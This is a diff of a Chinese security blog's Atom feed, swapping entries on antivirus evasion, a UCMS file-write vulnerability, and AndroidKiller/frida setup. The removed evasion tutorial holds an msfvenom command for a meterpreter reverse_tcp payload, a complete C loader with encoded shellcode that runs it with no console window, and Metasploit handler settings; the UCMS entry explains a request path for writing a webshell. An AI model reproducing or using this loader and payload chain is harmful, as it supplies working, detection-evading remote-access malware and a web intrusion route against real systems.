@@ -140,26 +140,27 @@
   </entry>
   
   <entry>
-    <title>免杀入门</title>
-    <link href="http://bai-ren-1.github.io/2020/09/05/%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/"/>
-    <id>http://bai-ren-1.github.io/2020/09/05/%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/</id>
-    <published>2020-09-05T05:21:16.000Z</published>
-    <updated>2020-09-05T07:47:21.039Z</updated>
+    <title>Ucms</title>
+    <link href="http://bai-ren-1.github.io/2020/08/26/Ucms/"/>
+    <id>http://bai-ren-1.github.io/2020/08/26/Ucms/</id>
+    <published>2020-08-26T03:01:19.000Z</published>
+    <updated>2020-12-26T03:03:58.439Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="免杀入门"><a href="#免杀入门" class="headerlink" title="免杀入门"></a>免杀入门</h1><p>学习一下入门级别的免杀，记录一下。这里没啥环境测试环境就只使用火绒。</p><h2 id="0x00-无免杀"><a href="#0x00-无免杀" class="headerlink" title="0x00 无免杀"></a>0x00 无免杀</h2><p><img src="/2020/09/05/%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/1.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.108 LPORT=3333 -f exe -o origin.exe</span><br></pre></td></tr></table></figure><p>不做免杀直接生成，然后顺利被火绒所杀。</p><h2 id="0x01-C-免杀"><a href="#0x01-C-免杀" class="headerlink" title="0x01 C++免杀"></a>0x01 C++免杀</h2><h3 id="指针执行"><a href="#指针执行" class="headerlink" title="指针执行"></a>指针执行</h3><p>这是最常规的一种加载shellcode的方法，使用指针来执行函数，所以免杀效果可能比较一般 。先用Msfvenom生成c语言的shellcode，为了提高免杀效果，使用了shikata_ga_nai编码器：</p><p><img src="/2020/09/05/%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/2.png" alt></p><p>查看生成的shellcode.c中的shellcode：</p><p><img src="/2020/09/05/%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/3.png" alt></p><p>将上面的shellcode复制到加载器的“shellcode”处：</p><p><img src="/2020/09/05/%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/4.png" alt></p><blockquote><p>注意C++项目要添加C文件，需要在上方菜单栏“视图 -&gt; 解决方案资源管理器 -&gt; 右侧的菜单栏中选择源文件添加”才能加到项目中。下面放上来的是免杀的加载器代码。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] =</span><br><span class="line"><span class="comment">//"shellcode";</span></span><br><span class="line"><span class="string">"\xda\xc1\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x78\xbe\x21\xf2\x28"</span></span><br><span class="line"><span class="string">"\xb4\x31\x70\x17\x03\x70\x17\x83\xe1\xf6\xca\x41\x3c\x37\xd3"</span></span><br><span class="line"><span class="string">"\xde\x9a\x4c\x59\xa2\x04\x8c\x24\x83\xf9\x04\x99\x45\xc8\xfe"</span></span><br><span class="line"><span class="string">"\xc2\x26\xc2\x03\xf1\x40\xba\xf8\x23\xcd\xa5\x11\xae\xa8\xb2"</span></span><br><span class="line"><span class="string">"\xeb\x1a\xdb\x13\x07\xe5\xe7\x05\x4a\x94\x7f\xf1\x17\xd5\x66"</span></span><br><span class="line"><span class="string">"\x1c\x40\xd5\x64\x89\xdf\xe3\x47\x81\x1e\x57\xd4\xae\xa2\xc5"</span></span><br><span class="line"><span class="string">"\x71\x60\xe2\x9b\xc8\x48\xca\x31\xdf\x3e\x81\xaf\xa1\x79\x2a"</span></span><br><span class="line"><span class="string">"\xd3\xcf\x84\xee\x10\xbf\xff\x46\x59\xa4\xe1\x9e\x0b\x8d\x21"</span></span><br><span class="line"><span class="string">"\x7a\x89\x49\xa9\x77\xdd\xda\x70\xf8\x4f\xa2\xc8\x85\x76\x36"</span></span><br><span class="line"><span class="string">"\x4f\xbe\x44\x49\xae\x95\x49\xe0\xc5\xa2\x27\x9a\xfc\x97\xa7"</span></span><br><span class="line"><span class="string">"\x53\x0c\x59\x52\x26\x7f\x2e\x55\x57\x6d\x04\xb4\x45\x03\x73"</span></span><br><span class="line"><span class="string">"\x45\x7f\xbc\xa5\x47\xd8\xbb\x99\xa1\x7c\xf7\x3d\x67\xca\x4b"</span></span><br><span class="line"><span class="string">"\x4a\xd5\x6d\xed\xe7\xe6\x9a\xa8\xc1\xa1\x26\x4d\x27\x1a\x05"</span></span><br><span class="line"><span class="string">"\x38\x4d\x42\x12\x72\xcf\xff\xd9\x88\x6b\xbe\x88\xeb\xba\x7a"</span></span><br><span class="line"><span class="string">"\x2f\xa3\x63\x2b\x3e\x08\x4f\x30\xdd\xe5\xaa\xbe\x8b\x4a\x03"</span></span><br><span class="line"><span class="string">"\xba\x2f\xa9\xed\xc3\x5e\x72\x46\xfd\x46\x37\xdb\xf0\xaf\x55"</span></span><br><span class="line"><span class="string">"\x56\xef\x46\xc8\x7e\x56\x4c\x05\xc5\x09\x87\x1f\x65\xbe\xd7"</span></span><br><span class="line"><span class="string">"\x85\xe3\xbb\x40\xe6\xe3\x96\x6c\xa0\x40\x0f\x40\x1b\xa2\x3f"</span></span><br><span class="line"><span class="string">"\xe2\xc6\x4b\x13\x71\x4a\x54\xde\x44\xb8\x32\xf3\x10\x90\x16"</span></span><br><span class="line"><span class="string">"\x11\xde\x9e\xf3\x6d\xf9\x08\xcc\x88\xfd\x9a\xf8\xcc\x5a\x8e"</span></span><br><span class="line"><span class="string">"\xa7\x24\x42\x04\xe2\x13\xa9\xbc\xac\xb5\x5c\xec\xc0\x1c\x81"</span></span><br><span class="line"><span class="string">"\x23\x7e\xee\xcc\xb6\xce\xd3\x19\x0b\xbf\x32\x20\x52\x3b\x61"</span></span><br><span class="line"><span class="string">"\x0f\xf9\xf7\x2a\x3f\xc0\xc8\x7d\x9c\x85\x81\x52\xbe\x4a\x1c"</span></span><br><span class="line"><span class="string">"\x1b\xc8\x3e\x4b\x38\xdb\x92\xb2\xfa\x31\x38\x07\xdc\x38\xc7"</span></span><br><span class="line"><span class="string">"\x9f\x9a\x8f\x34\xc8\x36\x24\x33\xd8\xd1\x20\x73\xc5\x6a\x66"</span></span><br><span class="line"><span class="string">"\xf1\xa1\xa5\xda\xf9\xa7\x03\x8e\x98\xc3\x03\x8a\x4a\x1c\xa3"</span></span><br><span class="line"><span class="string">"\x2b\x3a\x46\xd8\x89\x71\x75\xa8\xa8\xb9\x78\x7c\x4d\x9b\x70"</span></span><br><span class="line"><span class="string">"\x5a\xc0\xaf\xb6\xe2\xbc\x82\x63\x5d\x03\x98\xc5\x67\x57\xe8"</span></span><br><span class="line"><span class="string">"\xbc\xf0\x5b\x9f\x30\x4b\x09\xd0\x1b\x27\xfe\x26\x6d\xc9\x35"</span></span><br><span class="line"><span class="string">"\x6c\xd8\x3d\x9b\x4a\x0d\x1c\x55\xca\xaf\x8a\xab\xc9\xbb\xc0"</span></span><br><span class="line"><span class="string">"\xcf\x44\x27\xc6\x08\xcf\xe1\xf6\x3e\xb6\x24\x90\xe6\xc6\x6f"</span></span><br><span class="line"><span class="string">"\x44\xac\xb7\xcb\x04\x44\xe8\x50\x3d\xda\xa0\x3b\x52\x27\x36"</span></span><br><span class="line"><span class="string">"\xa5\x7d\x09\xf6\x53\x84\x94\x91\x3a\xb9\xbd\x9e\x87\xbb\x1f"</span></span><br><span class="line"><span class="string">"\xfc\x6a\xb2\x70\xce\x21\x77\x84"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">"/subsystem:\"Windows\" /entry:\"mainCRTStartup\""</span>) <span class="comment">//windows控制台程序不出黑窗口</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ((<span class="keyword">void</span>(*)(<span class="keyword">void</span>)) &amp; buf)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>选择上面菜单栏的“生成 -&gt; 生成project1”就能在debug目录下拿到exe程序啦。</p></blockquote><p>首先进行上线的实验，在kali的msf中执行下面这些代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.2.108 </span><br><span class="line">set LPORT 3333</span><br><span class="line">set EnableStageEncoding true</span><br></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<h2 id="Ucms"><a href="#Ucms" class="headerlink" title="Ucms"></a>Ucms</h2><p>写着玩。</p><p><img src="/2020/08/26/Ucms/1.png" alt></p><p>全局搜索fopen：</p><p><img src="/2020/08/26/Ucms/2.png" alt></p><p>跟进最后一项，发现可以操作：</p><p><img src="/2020/08/26/Ucms/3.png" alt></p><p>里面就是根据$alldir和$filename变量打开文件并且往其中写入$content（$content的内容是我们POST直接可控的）。然后我们看上面需要什么限定：</p><p><img src="/2020/08/26/Ucms/4.png" alt></p><p>发现$alldir和$filename变量都是我们GET直接可控的，并且需要赋值才能走到我们下面的利用点。然后最开始的要求就是要“定义了admin”。我们就看到入口文件index.php：</p><p><img src="/2020/08/26/Ucms/5.png" alt></p><p>看到了我们定义了admin的语句啦，就说明我们不能直接访问上面的fileedit.php，否则就会admin没定义而exit；我们需要在定义了admin的index.php从找到如何进入fileedit.php：</p><p><img src="/2020/08/26/Ucms/6.png" alt></p><p>直接提交GET参数do，然后就会根据_符号进行分割。其中分割后所得的前半部分是路径，后半部分是文件名，然后将路径和文件名得到的文件包含进来。那我们为了包含上面的fileedit.php，就得构造?do=sadmin_fileedit的参数。</p><p><img src="/2020/08/26/Ucms/7.png" alt></p><p>最后在根目录就能看到写入的文件，这里完全可以写成一个webshell。</p><p>记得进入写文件操作前有个checktoken的检查方法，得把token放在POST内容上。否则提示非法：</p><p><img src="/2020/08/26/Ucms/9.png" alt></p><p><a href="https://sunian19.github.io/2020/09/08/UCMS%20v.1.4.8%20Command%20execution/" target="_blank" rel="noopener">https://sunian19.github.io/2020/09/08/UCMS%20v.1.4.8%20Command%20execution/</a></p>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;h1 id=&quot;免杀入门&quot;&gt;&lt;a href=&quot;#免杀入门&quot; class=&quot;headerlink&quot; title=&quot;免杀入门&quot;&gt;&lt;/a&gt;免杀入门&lt;/h1&gt;&lt;p&gt;学习一下入门级别的免杀，记录一下。这里没啥环境测试环境就只使用火绒。&lt;/p&gt;
-&lt;h2 id=&quot;0x00-无免杀&quot;&gt;&lt;a hr
+        &lt;h2 id=&quot;Ucms&quot;&gt;&lt;a href=&quot;#Ucms&quot; class=&quot;headerlink&quot; title=&quot;Ucms&quot;&gt;&lt;/a&gt;Ucms&lt;/h2&gt;&lt;p&gt;写着玩。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/2020/08/26/Ucms/1.png&quot; alt&gt;&lt;/p&gt;
+&lt;p&gt;全局搜索
       
     
     </summary>
     
     
-      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
+      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
     
     
   </entry>
@@ -434,6 +435,30 @@
   </entry>
   
   <entry>
+    <title>AndroidKiller配置</title>
+    <link href="http://bai-ren-1.github.io/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/"/>
+    <id>http://bai-ren-1.github.io/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/</id>
+    <published>2020-06-29T14:49:16.000Z</published>
+    <updated>2020-06-29T15:23:19.579Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="AndroidKiller配置"><a href="#AndroidKiller配置" class="headerlink" title="AndroidKiller配置"></a>AndroidKiller配置</h1><p>AndroidKiller挺老了，但是用了下真的好方便，加上一些配置后感觉老廉颇了。所以记录一下，后面为了方便我都叫他AK。先贴上吾爱上的工具改造参考贴：<a href="https://www.52pojie.cn/thread-726176-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-726176-1-1.html</a> ，改造的过程根据帖子实现即可。</p><h2 id="0x00-AK连接夜神"><a href="#0x00-AK连接夜神" class="headerlink" title="0x00 AK连接夜神"></a>0x00 AK连接夜神</h2><p>记录一下AK如何通过adb连接到夜神模拟器上。首先我们开启夜神模拟器，然后通过pid号获取到它的端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic process where (name like &apos;%%Nox.exe%%&apos;) get processid /value</span><br><span class="line">netstat -ano | findstr 11308 | findstr LISTENING</span><br></pre></td></tr></table></figure><blockquote><p>这里获取进程号是直接使用wmic实现的，但也可以手动去任务管理器中找到夜神模拟器的进程号。然后在第二条命令中，将夜神模拟器的进程号替换在第一个管道符后的findstr后即可找到夜神的监听端口号，这里找到的pid是11308。</p></blockquote><p><img src="/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/1.png" alt></p><p>上图中我们可以找到夜神模拟器的监听端口是26966。然后我们进入到AK的目录，使用AK中的adb的命令连接到刚才我们找到的夜神模拟器的监听端口上：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd E:\AndroidKiller\bin\adb</span><br><span class="line">adb.exe connect 127.0.0.1:26966</span><br></pre></td></tr></table></figure><blockquote><p>切记这里使用的是AK中的adb！因为有的人还有自己搭建的adb，包括夜神模拟器中也会有adb，注意区分。</p></blockquote><p><img src="/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/2.png" alt></p><p>上面显示连接AK成功，然后我们在AK中也可以看到成功搜索到了夜神模拟器：</p><p><img src="/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/3.png" alt></p><h2 id="0x01-夜神模拟器搭建frida"><a href="#0x01-夜神模拟器搭建frida" class="headerlink" title="0x01 夜神模拟器搭建frida"></a>0x01 夜神模拟器搭建frida</h2><p>frida是个无敌的框架，我导师叫我去学习一下。所以这里先记录一下搭建的过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple/ frida frida-tools</span><br></pre></td></tr></table></figure><blockquote><p>这里用了个小trick就是pip安装也是可以通过i参数指定源的，这里选用清华的源就会下载快很多。</p></blockquote><p><img src="/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/4.png" alt></p><p>然鹅它卡在了安装frida安装的这一步，进行了查阅： <a href="https://www.jianshu.com/p/f91d92ce2b23" target="_blank" rel="noopener">https://www.jianshu.com/p/f91d92ce2b23</a> 。按照帖子的方法进行安装就可以了：</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;AndroidKiller配置&quot;&gt;&lt;a href=&quot;#AndroidKiller配置&quot; class=&quot;headerlink&quot; title=&quot;AndroidKiller配置&quot;&gt;&lt;/a&gt;AndroidKiller配置&lt;/h1&gt;&lt;p&gt;AndroidKiller挺老了，但
+      
+    
+    </summary>
+    
+    
+      <category term="Android" scheme="http://bai-ren-1.github.io/categories/Android/"/>
+    
+    
+  </entry>
+  
+  <entry>
     <title>Android刷题</title>
     <link href="http://bai-ren-1.github.io/2020/06/29/Android%E5%88%B7%E9%A2%98/"/>
     <id>http://bai-ren-1.github.io/2020/06/29/Android%E5%88%B7%E9%A2%98/</id>
@@ -448,30 +473,6 @@
       
         &lt;h1 id=&quot;Android刷题&quot;&gt;&lt;a href=&quot;#Android刷题&quot; class=&quot;headerlink&quot; title=&quot;Android刷题&quot;&gt;&lt;/a&gt;Android刷题&lt;/h1&gt;&lt;p&gt;老样子开始刷题啦，记录记录。&lt;/p&gt;
 &lt;h2 id=&quot;0x00-EasyAndroi
-      
-    
-    </summary>
-    
-    
-      <category term="Android" scheme="http://bai-ren-1.github.io/categories/Android/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>AndroidKiller配置</title>
-    <link href="http://bai-ren-1.github.io/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/"/>
-    <id>http://bai-ren-1.github.io/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/</id>
-    <published>2020-06-29T14:49:16.000Z</published>
-    <updated>2020-06-29T15:23:19.579Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="AndroidKiller配置"><a href="#AndroidKiller配置" class="headerlink" title="AndroidKiller配置"></a>AndroidKiller配置</h1><p>AndroidKiller挺老了，但是用了下真的好方便，加上一些配置后感觉老廉颇了。所以记录一下，后面为了方便我都叫他AK。先贴上吾爱上的工具改造参考贴：<a href="https://www.52pojie.cn/thread-726176-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-726176-1-1.html</a> ，改造的过程根据帖子实现即可。</p><h2 id="0x00-AK连接夜神"><a href="#0x00-AK连接夜神" class="headerlink" title="0x00 AK连接夜神"></a>0x00 AK连接夜神</h2><p>记录一下AK如何通过adb连接到夜神模拟器上。首先我们开启夜神模拟器，然后通过pid号获取到它的端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic process where (name like &apos;%%Nox.exe%%&apos;) get processid /value</span><br><span class="line">netstat -ano | findstr 11308 | findstr LISTENING</span><br></pre></td></tr></table></figure><blockquote><p>这里获取进程号是直接使用wmic实现的，但也可以手动去任务管理器中找到夜神模拟器的进程号。然后在第二条命令中，将夜神模拟器的进程号替换在第一个管道符后的findstr后即可找到夜神的监听端口号，这里找到的pid是11308。</p></blockquote><p><img src="/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/1.png" alt></p><p>上图中我们可以找到夜神模拟器的监听端口是26966。然后我们进入到AK的目录，使用AK中的adb的命令连接到刚才我们找到的夜神模拟器的监听端口上：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd E:\AndroidKiller\bin\adb</span><br><span class="line">adb.exe connect 127.0.0.1:26966</span><br></pre></td></tr></table></figure><blockquote><p>切记这里使用的是AK中的adb！因为有的人还有自己搭建的adb，包括夜神模拟器中也会有adb，注意区分。</p></blockquote><p><img src="/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/2.png" alt></p><p>上面显示连接AK成功，然后我们在AK中也可以看到成功搜索到了夜神模拟器：</p><p><img src="/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/3.png" alt></p><h2 id="0x01-夜神模拟器搭建frida"><a href="#0x01-夜神模拟器搭建frida" class="headerlink" title="0x01 夜神模拟器搭建frida"></a>0x01 夜神模拟器搭建frida</h2><p>frida是个无敌的框架，我导师叫我去学习一下。所以这里先记录一下搭建的过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple/ frida frida-tools</span><br></pre></td></tr></table></figure><blockquote><p>这里用了个小trick就是pip安装也是可以通过i参数指定源的，这里选用清华的源就会下载快很多。</p></blockquote><p><img src="/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/4.png" alt></p><p>然鹅它卡在了安装frida安装的这一步，进行了查阅： <a href="https://www.jianshu.com/p/f91d92ce2b23" target="_blank" rel="noopener">https://www.jianshu.com/p/f91d92ce2b23</a> 。按照帖子的方法进行安装就可以了：</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;AndroidKiller配置&quot;&gt;&lt;a href=&quot;#AndroidKiller配置&quot; class=&quot;headerlink&quot; title=&quot;AndroidKiller配置&quot;&gt;&lt;/a&gt;AndroidKiller配置&lt;/h1&gt;&lt;p&gt;AndroidKiller挺老了，但
       
     
     </summary>
